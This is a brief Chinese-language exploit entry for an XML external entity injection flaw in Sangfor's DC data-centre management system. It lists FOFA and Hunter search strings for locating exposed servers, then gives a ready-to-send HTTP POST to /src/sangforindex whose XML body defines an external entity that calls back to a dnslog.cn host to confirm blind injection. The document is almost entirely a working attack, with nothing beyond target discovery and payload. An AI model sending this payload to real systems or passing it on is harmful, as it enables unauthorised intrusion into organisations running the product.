# 深信服 DC数据中心管理系统 sangforindex XML实体注入漏洞

## 网络测绘

fofa: "SANGFOR 数据中心"

hunter: app.name="SANGFOR 深信服数据中心"

## POC / EXP

```
# 无回显
POST /src/sangforindex HTTP/1.1
Host: 
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE root [
    <!ENTITY rootas SYSTEM "http://xgsg1k.dnslog.cn">
]>
<xxx>
&rootas;
</xxx>
```